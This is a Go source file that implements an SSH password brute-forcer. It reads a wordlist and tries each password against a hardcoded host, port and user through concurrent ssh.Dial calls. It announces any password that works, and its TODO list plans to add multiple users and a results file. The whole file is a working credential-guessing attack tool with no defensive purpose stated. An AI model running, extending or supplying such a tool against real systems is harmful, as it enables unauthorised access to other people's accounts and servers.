/*
golang example to find a password for a ssh user
using a large wordlist file.
TODO: add args to set ipaddr, user(s), password file, adjust wait time for
connection and check time taken running, check if the ip is down, create a
results file.
*/
package main

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"time"

	"golang.org/x/crypto/ssh"
)

var inittime = time.Now()

var ipaddr string = "192.168.125.100"

var port int = 22

var user string = "test"

var passwordfile string = "passwords.txt"

// Define fileScanner with methods
type fileScanner struct {
	File    *os.File
	Scanner *bufio.Scanner
}

func NewFileScanner() *fileScanner {
	return &fileScanner{}
}

func (f *fileScanner) Open(path string) (err error) {
	f.File, err = os.Open(path)
	return err
}

func (f *fileScanner) Close() error {
	return f.File.Close()
}

func (f *fileScanner) GetScan() *bufio.Scanner {
	if f.Scanner == nil {
		f.Scanner = bufio.NewScanner(f.File)
		f.Scanner.Split(bufio.ScanLines)
	}
	return f.Scanner
}

type Dialer struct {
	password string
	err      error
}

func NewDialer() *Dialer {
	d := &Dialer{}
	return d
}

func sshdialer(password string, ch chan Dialer) {
	salida := NewDialer()
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		Timeout: 150 * time.Millisecond,
	}
	//Create dial
	_, err := ssh.Dial("tcp", ipaddr+":"+strconv.Itoa(port), config)
	if err != nil {
		fmt.Printf("Failed: %s ---", password)
	} else {
		end := time.Now()
		d := end.Sub(inittime)
		duration := d.Seconds()
		fmt.Printf("\n+++ Pattern found: %s +++\n", password)
		fmt.Printf("\nCompleted in %v senconds\n", strconv.FormatFloat(duration, 'g', -1, 64))
	}
	salida.password, salida.err = password, err
	ch <- *salida
}

var found bool

func main() {
	ch := make(chan Dialer)
	fscanner := NewFileScanner()
	err := fscanner.Open(passwordfile)
	if err != nil {
		fmt.Println("error in open file step: ", err.Error())
	} else {
		scanner := fscanner.GetScan()
		for scanner.Scan() {
			password := scanner.Text()
			go sshdialer(password, ch)
			// Don´t set this time lower, you need to have a proper time to get a response
			// the response time depends in several factors, it may work with 120 Milliseconds
			// but sometimes bypass the correct password.
			time.Sleep(180 * time.Millisecond)
			go func() {
				for x := range ch {
					if x.err != nil {
						fmt.Printf(".")
					} else {
						fmt.Println("Done!!!!, your password is: ", x.password)
						found = true
						return
					}
				}
			}()
			if found == true {
				break
			}
		}
	}
	fscanner.Close()
}
